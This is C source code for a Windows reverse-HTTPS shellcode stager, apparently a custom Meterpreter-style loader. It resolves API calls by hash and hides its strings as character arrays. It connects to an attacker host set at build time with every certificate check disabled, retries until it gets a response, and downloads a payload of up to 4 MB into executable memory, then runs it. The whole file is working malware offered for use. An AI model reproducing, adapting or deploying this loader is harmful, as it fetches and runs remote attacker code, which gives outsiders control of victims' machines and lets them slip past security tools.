#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) 
#include "settings.h"
#include "GetProcAddressWithHash.h"
#include "64BitHelper.h"
#include <windows.h>
#include <intrin.h>
#include <wininet.h>

typedef HMODULE(WINAPI *FuncLoadLibraryA) (
	_In_z_	LPTSTR lpFileName
	);

typedef LPVOID(WINAPI *FuncVirtualAlloc) (
	_In_opt_ LPVOID lpAddress,
	_In_     SIZE_T dwSize,
	_In_     DWORD  flAllocationType,
	_In_     DWORD  flProtect
	);

typedef HANDLE(WINAPI *FuncCreateThread) (
	_In_opt_  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	_In_      SIZE_T                 dwStackSize,
	_In_      LPTHREAD_START_ROUTINE lpStartAddress,
	_In_opt_  LPVOID                 lpParameter,
	_In_      DWORD                  dwCreationFlags,
	_Out_opt_ LPDWORD                lpThreadId
	);

typedef BOOL(WINAPI *FuncCloseHandle) (
	_In_ HANDLE hObject
	);

typedef HINTERNET(WINAPI *FuncInternetOpenA) (
	_In_ LPCTSTR lpszAgent,
	_In_ DWORD   dwAccessType,
	_In_ LPCTSTR lpszProxyName,
	_In_ LPCTSTR lpszProxyBypass,
	_In_ DWORD   dwFlags
	);

typedef HINTERNET(WINAPI *FuncInternetConnectW) (
	_In_ HINTERNET     hInternet,
	_In_ LPCTSTR       lpszServerName,
	_In_ INTERNET_PORT nServerPort,
	_In_ LPCTSTR       lpszUsername,
	_In_ LPCTSTR       lpszPassword,
	_In_ DWORD         dwService,
	_In_ DWORD         dwFlags,
	_In_ DWORD_PTR     dwContext
	);

typedef HINTERNET(WINAPI *FuncHttpOpenRequestW) (
	_In_ HINTERNET hConnect,
	_In_ LPCTSTR   lpszVerb,
	_In_ LPCTSTR   lpszObjectName,
	_In_ LPCTSTR   lpszVersion,
	_In_ LPCTSTR   lpszReferer,
	_In_ LPCTSTR   *lplpszAcceptTypes,
	_In_ DWORD     dwFlags,
	_In_ DWORD_PTR dwContext
	);

typedef BOOL(WINAPI *FuncInternetSetOptionA) (
	_In_ HINTERNET hInternet,
	_In_ DWORD     dwOption,
	_In_ LPVOID    lpBuffer,
	_In_ DWORD     dwBufferLength
	);

typedef BOOL(WINAPI *FuncHttpSendRequestA) (
	_In_ HINTERNET hRequest,
	_In_ LPCTSTR   lpszHeaders,
	_In_ DWORD     dwHeadersLength,
	_In_ LPVOID    lpOptional,
	_In_ DWORD     dwOptionalLength
	);

typedef BOOL(WINAPI *FuncInternetCloseHandle) (
	_In_ HINTERNET hInternet
	);

typedef BOOL(WINAPI *FuncHttpQueryInfoA) (
	_In_    HINTERNET hRequest,
	_In_    DWORD     dwInfoLevel,
	_Inout_ LPVOID    lpvBuffer,
	_Inout_ LPDWORD   lpdwBufferLength,
	_Inout_ LPDWORD   lpdwIndex
	);

typedef BOOL(WINAPI *FuncInternetReadFile) (
	_In_  HINTERNET hFile,
	_Out_ LPVOID    lpBuffer,
	_In_  DWORD     dwNumberOfBytesToRead,
	_Out_ LPDWORD   lpdwNumberOfBytesRead
	);

typedef int(WINAPI *FuncWideCharToMultiByte) (
	_In_      UINT    CodePage,
	_In_      DWORD   dwFlags,
	_In_      LPCWSTR lpWideCharStr,
	_In_      int     cchWideChar,
	_Out_opt_ LPSTR   lpMultiByteStr,
	_In_      int     cbMultiByte,
	_In_opt_  LPCSTR  lpDefaultChar,
	_Out_opt_ LPBOOL  lpUsedDefaultChar
	);


typedef int(WINAPI *FuncMultiByteToWideChar) (
	_In_      UINT   CodePage,
	_In_      DWORD  dwFlags,
	_In_      LPCSTR lpMultiByteStr,
	_In_      int    cbMultiByte,
	_Out_opt_ LPWSTR lpWideCharStr,
	_In_      int    cchWideChar
	);

typedef VOID(WINAPI *FuncSleep) (
	_In_ DWORD dwMilliseconds
	);


int atoi_(char *str)
{
	int res = 0;
	int i;
	for (i = 0; str[i] != '\0'; ++i)
		res = res * 10 + str[i] - '0';
	return res;
}

size_t strlen_(char *str) {
	size_t len = 0;
	while (*str != '\0') {
		str++;
		len++;
	}
	return len;
}

int TextChecksum8(char* text)
{
	UINT temp = 0;
	UINT i = 0;
	for (i = 0; i < strlen_(text); i++)
	{
		temp += (int)text[i];
	}
	return temp % 0x100;
}

void gen_random(char *s, const int len, unsigned int r) {
	char alphanum[] =
	{ '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
		'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',  'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',  'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',  'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',  0 };

	int i;

	for (i = 0; i < len; ++i) {
		s[i] = alphanum[r % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}

char *strcpy_(char *dest, char *src) {
	char *orig = dest;
	while ((*dest++ = *src++) != '\0')
		; // <<== Very important!!!
	return orig;
}

char* strcat_(char* dest_ptr, const char * src_ptr)
{
	char* strret = dest_ptr;
	if ((NULL != dest_ptr) && (NULL != src_ptr))
	{
		while (NULL != *dest_ptr)
		{
			dest_ptr++;
		}
		while (NULL != *src_ptr)
		{
			*dest_ptr++ = *src_ptr++;
		}
		*dest_ptr = NULL;
	}
	return strret;
}

wchar_t* mbstowcs_(char* p)
{
	FuncVirtualAlloc MyVirtualAlloc;
	wchar_t *r;
	char *tempsour;
	wchar_t *tempdest;
	MyVirtualAlloc = (FuncVirtualAlloc)GetProcAddressWithHash(0xE553A458);
	r = MyVirtualAlloc(0, strlen_(p) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	tempsour = p;
	tempdest = r;
	while (*tempdest++ = *tempsour++);

	return r;
}

void myMemCpy(void *dest, void *src, size_t n)
{
	// Typecast src and dest addresses to (char *)
	char *csrc = (char *)src;
	char *cdest = (char *)dest;
	int i;

	// Copy contents of src[] to dest[]
	for (i = 0; i<n; i++)
		cdest[i] = csrc[i];
}


VOID TestThread()
{
	FuncLoadLibraryA MyLoadLibraryA;
	FuncInternetOpenA MyInternetOpenA;
	FuncInternetConnectW MyInternetConnectW;
	FuncHttpOpenRequestW MyHttpOpenRequestW;
	FuncInternetSetOptionA MyInternetSetOptionA;
	FuncHttpSendRequestA MyHttpSendRequestA;
	FuncInternetCloseHandle MyInternetCloseHandle;
	FuncHttpQueryInfoA MyHttpQueryInfoA;
	FuncInternetReadFile MyInternetReadFile;
	FuncVirtualAlloc MyVirtualAlloc;
	FuncSleep MySleep;
	
	int URI_CHECKSUM_INITW = 92;

	int checksum = 0;
	char URI[5] = { 0 };
	char* booof = NULL;
	wchar_t *wFullURL;
	DWORD flags = 0;
	char ansiPort[16] = { 0 };

	HINTERNET hInternetOpen;
	HINTERNET hInternetConnect;
	HINTERNET hInternetRequest;
	DWORD dwSecFlags = 0;

	int statusCode;
	char responseText[256];
	DWORD responseTextSize;

	BOOL bKeepReading = TRUE;
	DWORD dwBytesRead = -1;
	DWORD dwBytesWritten = 0;


	char module[] = { 'w', 'i', 'n', 'i', 'n', 'e', 't', 0 };
	char bar[] = { '/', 0 };
	char stringEnd[] = { '\0', 0 };
    char userAgent[] = REVERSE_HTTPS_USERAGENT;
	wchar_t IP[] = REVERSE_HTTPS_HOST;
	char iPort[] = REVERSE_HTTPS_PORT;
	wchar_t get[] = { 'G', 'E', 'T', 0 };
	wchar_t url[6] = { 0 };


	//Static UUID x86
	//#ifdef _WIN32
	//	char FullURL[] = { '/', 'I', 'N', 'L', 'p', 'v', 'W', 'C', 'n', 'r', 'd', '0', 'E', 'S', 'w', 'V', 'K', 'X', 'c', 'O', '3', 'v', 'w', 'S', 's', 'J', 'J', '6', '3', 'I', 'i', 'B', 'G', '7', '1', 'x', 's', '1', 'P', 'A', 'j', 'Z', 'Z', 'P', 'l', 'G', 'T', '-', 'U', '0', 'G', 'V', 'K', 'l', 'q', 'A', 'P', 'n', '8', '2', '6', '9', 'a', 'L', 'E', '5', 'b', 'u', 'I', 'D', 'X', 'F', 'G', '2', 'F', 'K', 'w', 'u', '8', '5', 'y', 'N', 'E', 'l', 'g', 'q', 'm', 'i', '9', 'T', '3', 'S', 'L', '7', 'W', 's', 'M', 'K', '9', 'y', 'T', 'z', 'g', 'n', 'Q', '6', 'Y', 'I', 'j', 'B', 0 };
	//
	//#endif

	//Static UUID x64
	#ifdef _WIN64
		char FullURL1[] = { 'Y', 'e', 'n', 'Z', 'U', 'H', 'L', 'm', '3', 'b', 'i', 'D', 'C', 'Y', 'I', 'L', '2', 'o', 'V', 'k', 'd', 'g', 'n', 'P', '7', 'X', 'i', 'r', 'q', 't', 'q', 'T', 'y', 'S', '7', '8', 'a', 0 };
		char FullURL2[] = { 'M', 'h', '5', 'b', 'h', 'W', '3', '5', '9', 'g', 'o', 'B', 't', 'L', 'd', 'm', 'w', 'g', 'h', 'e', 'A', 'Q', 'E', '9', 'b', 'v', 'c', 'O', 'Z', 'B', '1', 'o', 'z', 'N', 'k', '6', '3',0 };
	#endif
	

	unsigned long int next = 1;
	unsigned char * concatenation;

	MyLoadLibraryA = (FuncLoadLibraryA)GetProcAddressWithHash(0x0726774C);
	MyLoadLibraryA((LPTSTR)module);

	MyInternetOpenA = (FuncInternetOpenA)GetProcAddressWithHash(0xA779563A);
	MyInternetConnectW = (FuncInternetConnectW)GetProcAddressWithHash(0xC74F8957);
	MyHttpOpenRequestW = (FuncHttpOpenRequestW)GetProcAddressWithHash(0x3BDE55EB);
	MyInternetSetOptionA = (FuncInternetSetOptionA)GetProcAddressWithHash(0x869E4675);
	MyInternetCloseHandle = (FuncInternetCloseHandle)GetProcAddressWithHash(0xD46E6BD3);
	MyHttpQueryInfoA = (FuncHttpQueryInfoA)GetProcAddressWithHash(0xB6067072);
	MyInternetReadFile = (FuncInternetReadFile)GetProcAddressWithHash(0xE2899612);
	MyVirtualAlloc = (FuncVirtualAlloc)GetProcAddressWithHash(0xE553A458);
	MyHttpSendRequestA = (FuncHttpSendRequestA)GetProcAddressWithHash(0x7B18062D);
	MySleep = (FuncSleep)GetProcAddressWithHash(0xE035F044);
	
#ifdef _WIN64
	concatenation = (unsigned char*)MyVirtualAlloc(0, sizeof(FullURL1) + sizeof(FullURL2), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	myMemCpy(concatenation, FullURL1, sizeof FullURL1);
	myMemCpy(concatenation + sizeof FullURL1 - 1, FullURL2, sizeof FullURL1);

	wFullURL = mbstowcs_(concatenation);
#endif

	//#ifdef _WIN32
	//	wFullURL = mbstowcs_(FullURL);
	//#endif

	flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI		 | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_PRAGMA_NOCACHE);

	hInternetOpen = MyInternetOpenA((LPCTSTR)userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	hInternetConnect = MyInternetConnectW(hInternetOpen, IP, atoi_(iPort), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	hInternetRequest = MyHttpOpenRequestW(hInternetConnect, get, (LPCTSTR)wFullURL, NULL, NULL, NULL, flags, NULL);

	dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
	MyInternetSetOptionA(hInternetRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));

	connect:

	if (!MyHttpSendRequestA(hInternetRequest, NULL, NULL, NULL, NULL))
	{
		MySleep(1000);
		goto connect;
	};

	responseTextSize = sizeof(responseText);

	MyHttpQueryInfoA(hInternetRequest, HTTP_QUERY_STATUS_CODE, &responseText, &responseTextSize, NULL);
	statusCode = atoi_(responseText);

	if (statusCode != HTTP_STATUS_OK) {
		MySleep(1000);
		goto connect;
	}

	booof = (char*)MyVirtualAlloc(0, (4 * 1024 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	while (bKeepReading && dwBytesRead != 0)
	{
		bKeepReading = MyInternetReadFile(hInternetRequest, (booof + dwBytesWritten), 4096, &dwBytesRead);
		dwBytesWritten += dwBytesRead;
	}

	MyInternetCloseHandle(hInternetRequest);
	MyInternetCloseHandle(hInternetConnect);
	MyInternetCloseHandle(hInternetOpen);

	(*(void(*)())booof)();
}


VOID ExecutePayload(VOID)
{
	FuncCreateThread MyCreateThread;
	FuncCloseHandle MyCloseHandle;
	HANDLE ht;
	
	#pragma warning(push)
	#pragma warning(disable : 4055) // Ignore cast warnings

	FuncVirtualAlloc MyVirtualAlloc;

	MyCreateThread = (FuncCreateThread)GetProcAddressWithHash(0x160D6838);
	MyCloseHandle = (FuncCloseHandle)GetProcAddressWithHash(0x528796C6);

	ht = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&TestThread, NULL, 0, NULL);
	MyCloseHandle(ht);

	#pragma warning(pop)
	__nop();
	__nop();
	__nop();
	__nop();
	__nop();
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    ExecutePayload();
}